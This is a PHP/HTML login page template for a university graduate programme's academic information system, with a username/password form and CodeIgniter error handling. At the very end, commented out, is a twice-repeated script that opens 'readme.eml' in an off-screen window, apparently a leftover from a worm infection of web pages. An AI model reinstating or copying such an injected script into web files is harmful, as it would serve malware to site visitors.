<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from endlesstheme.com/Perfect_Admin/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Nov 2017 03:19:15 GMT -->
<head>
<style type="text/css">
            #main {
                background-image: url('pps.png');
                height: 470px; 
                width: 720px; 
            }
        </style>
    <meta charset="utf-8">
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Bootstrap core CSS -->
    <link href="<?php echo base_url();?>bootstrap/css/bootstrap.min.css" rel="stylesheet">

	<!-- Font Awesome -->
	<link href="<?php echo base_url();?>css/font-awesome.min.css" rel="stylesheet">

	<!-- Perfect -->
	<link href="<?php echo base_url();?>css/app.min.css" rel="stylesheet">


  </head>

  <body>
  
		<div id="main">
        </div>
		
	<div class="login-wrapper">
		<div class="text-center">
			<h2 class="fadeInUp animation-delay8" style="font-weight:bold">
				<span class="text-success">Sistem Informasi Akademik </span>
			</h2>
		</div>
    <div class="text-center">
      <h2 class="fadeInUp animation-delay8" style="font-weight:bold">
        <span style="color:#ccc; text-shadow:0 1px #fff">Program Pasca Sarjana UM Parepare</span>
      </h2>
    </div>
		<div class="login-widget animation-delay1">
			<div class="panel panel-default">
				<div class="panel-heading clearfix">
					<div class="pull-left">
						<i class="fa fa-lock fa-lg">Login</i>
					</div>
				</div>

				<div class="panel-body">
					<form class="form-login" method="POST" action="<?php echo site_url();?>login">
						<div class="form-group">
							<label>Username</label>
							<input type="text" placeholder="Username" name="username" id="username" class="form-control input-sm bounceIn animation-delay2">
						</div>
						<div class="form-group">
							<label>Password</label>
							<input type="password" placeholder="Password" name="password" id="password" class="form-control input-sm bounceIn animation-delay4">
            </div>
            <div class="form-group">
              <?php
                $valid=validation_errors();
                if (!empty($valid)) {
                  # code...]
                  ?>
                  <div class="alert alert-error">
                    <strong>Warnig!</strong>
                    <?php
                    echo validation_errors();
                    ?>
                  </div>
                  <?php
                }
                $info=$this->session->flashdata('result_login');
                if (!empty($info)) {
                  # code...]
                  ?>
                  <div class="alert alert-error">
                    <strong>Warrnig!</strong>
                    <?php
                    echo validation_errors();
                    echo $info;
                  }
                ?>
                  </div>
            </div>
						<hr/>
            <button type="submit" class="btn btn-success btn-sm bounceIn pull-right animation-delay5"><i class="fa fa-sign-in">Login</i></button>
					</form>
				</div>
			</div><!-- /panel -->
		</div><!-- /login-widget -->
	</div><!-- /login-wrapper -->

    <!-- Le javascript <i class="fa fa-sign-in"></i>
    class="btn btn-success btn-sm bounceIn animation-delay5 login-link pull-right"
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->

    <!-- Jquery -->

	<script src="<?php echo base_url();?>js/jquery-1.10.2.min.js"></script>

    <!-- Bootstrap -->
    <script src="<?php echo base_url();?>bootstrap/js/bootstrap.min.js"></script>

	<!-- Modernizr -->
	<script src='<?php echo base_url();?>js/modernizr.min.js'></script>

    <!-- Pace -->
	<script src='<?php echo base_url();?>js/pace.min.js'></script>

	<!-- Popup Overlay -->
	<script src='<?php echo base_url();?>js/jquery.popupoverlay.min.js'></script>

    <!-- Slimscroll -->
	<script src='<?php echo base_url();?>js/jquery.slimscroll.min.js'></script>

	<!-- Cookie -->
	<script src='<?php echo base_url();?>js/jquery.cookie.min.js'></script>

	<!-- Perfect -->
	<script src="<?php echo base_url();?>js/app/app.js"></script>

  </body>

<!-- Mirrored from endlesstheme.com/Perfect_Admin/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Nov 2017 03:19:15 GMT -->
</html>

<!--<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> -->
